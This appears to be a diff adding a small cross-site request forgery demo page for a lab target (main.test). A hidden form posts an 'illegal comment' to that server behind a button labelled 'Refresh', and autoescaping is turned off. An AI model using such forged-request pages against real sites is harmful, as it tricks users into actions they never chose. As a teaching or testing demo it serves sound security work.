@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+{% autoescape false %}
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>CSRF Demo</title>
+    <script>
+      // add time into comment on page load
+      window.onload = function() {
+        var comment = document.getElementsByName("comment")[0];
+        var now = new Date();
+        comment.value += " (" + now.toLocaleString() + ")";
+      }
+
+    </script>
+  </head>
+
+  <body>
+    <form action="http://main.test:16589" method="POST">
+      <input type="hidden" name="comment" value="[CSRF] illegal comment" />
+      <input type="submit" value="Refresh" />
+    </form>
+  </body>
+</html>
+{% endautoescape %}
